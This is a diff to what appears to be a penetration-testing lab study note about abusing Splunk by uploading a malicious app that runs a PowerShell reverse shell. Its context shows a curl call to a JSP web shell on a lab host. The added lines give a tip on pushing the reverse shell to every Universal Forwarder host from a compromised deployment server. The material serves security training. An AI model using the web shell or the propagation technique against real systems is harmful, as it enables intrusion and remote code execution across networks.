@@ -305,7 +305,7 @@ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
 ### Abusing Built-In Functionality
 - We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The bin directory in this repo has examples for Python and PowerShell. Let's walk through this step-by-step.
 
-- The bin directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our inputs.conf file. Our reverse shell will be a PowerShell one-liner.
+- The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our inputs.conf file. Our reverse shell will be a PowerShell one-liner.
 ```powershell
 #A simple and small reverse shell. Options and help removed to save space. 
 #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
@@ -344,3 +344,6 @@ splunk_shell/default/inputs.conf
 > ![NOTE]
 > If we were dealing with a Linux host, we would need to edit the rev.py Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.
 
+> ![!TIP]
+> - If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. 
+> - In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.
